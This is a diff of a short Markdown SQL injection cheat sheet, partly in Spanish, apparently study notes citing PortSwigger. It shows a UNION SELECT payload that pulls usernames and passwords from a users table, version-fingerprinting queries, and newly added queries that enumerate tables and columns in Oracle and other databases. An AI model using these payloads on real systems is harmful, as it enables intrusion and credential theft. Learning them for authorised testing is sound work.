@@ -24,5 +24,17 @@ CONCATENATION:  ```' UNION SELECT username || '~' || password FROM users-- ```
 | Oracle | `SELECT * FROM v$version` |
 | PostgreSQL | `SELECT version()` |
 
+Contenido de todas la DB menos ORACLE:
+
+Extraccion de tablas: ```SELECT * FROM information_schema.tables```
+
+Extraccion de columnas: ```SELECT * FROM information_schema.columns WHERE table_name = 'Users'```
+
+Contenido de DB ORACLE
+
+Extraccion de tablas: ```SELECT * FROM all_tables```
+
+Extraccion de columnas: ```SELECT * FROM all_tab_columns WHERE table_name = 'USERS'```
+
 # Referencias
 - [Burpsuite](https://portswigger.net/web-security/sql-injection/cheat-sheet)
